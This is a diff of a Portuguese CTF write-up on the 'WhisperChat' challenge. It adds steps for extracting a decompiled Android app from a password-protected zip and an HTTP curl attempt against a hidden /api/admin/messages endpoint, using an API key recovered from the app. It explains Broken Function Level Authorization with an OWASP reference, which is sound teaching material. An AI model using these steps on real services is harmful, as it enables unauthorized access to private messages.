@@ -42,7 +42,26 @@ Na minha instância o host era esse. A API key vem do app (abaixo).
 
 ## Resolução
 
-### 1. Revisão do código: a key e o endpoint escondido
+### 1. Extração dos arquivos
+
+O `public.zip` (senha `infected`) traz o app decompilado e um `whisper_client.py` de exemplo. `unzip` não abre o AES, então `7z`:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+7z x -pinfected public.zip -oextracted && find extracted -name '*.java' -o -name '*.py' -o -name 'strings.xml'
+```
+
+```text
+extracted/WhisperChat/res/values/strings.xml
+extracted/.../com/whisperchat/app/data/ApiClient.java
+extracted/.../com/whisperchat/app/data/WhisperApi.java
+extracted/whisper_client.py
+```
+
+A presença do `WhisperApi.java` (interface Retrofit) e do `ApiClient.java` (onde ficam headers e key) já diz onde olhar.
+
+### 2. Revisão do código: a key e o endpoint escondido
 
 O client de exemplo (`whisper_client.py`) e o `ApiClient.java` carregam a mesma key:
 
@@ -82,9 +101,21 @@ O comentário entrega tudo: `api/admin/messages` devolve todos os canais, inclus
 > [!TIP]
 > **Conceito: controle de acesso no cliente + endpoint oculto (BOLA/BFLA).** Esconder um endpoint da UI não é autorização. Decompilar o app lista todas as rotas do contrato (aqui, uma interface Retrofit inteira). Se a rota administrativa não valida o papel no servidor (só confia que "só staff chega até aqui"), é Broken Function Level Authorization. Referência: [OWASP API Security: API5 Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/).
 
-### 2. Exploração
+### 3. Exploração
 
-Baseline: o endpoint público `/api/messages` já responde com a key. Depois chamo o endpoint oculto `/api/admin/messages`, que a UI nunca exporia.
+Primeiro apontei pro `http://` e tomei timeout (porta 80 morta):
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+curl -i -s --max-time 12 "http://$TARGET/api/admin/messages" -H "X-API-Key: $APIKEY"
+```
+
+```text
+curl: (28) Connection timed out after 12002 milliseconds
+```
+
+**Isso não funcionou** (pule ao replicar): HTTP não responde. Passei pra HTTPS. Como baseline, o endpoint público `/api/messages` já responde com a key (confirma que a key é válida). Depois chamo o endpoint oculto `/api/admin/messages`, que a UI nunca exporia:
 
 ***INSERIR no terminal: Kali (atacante)
 
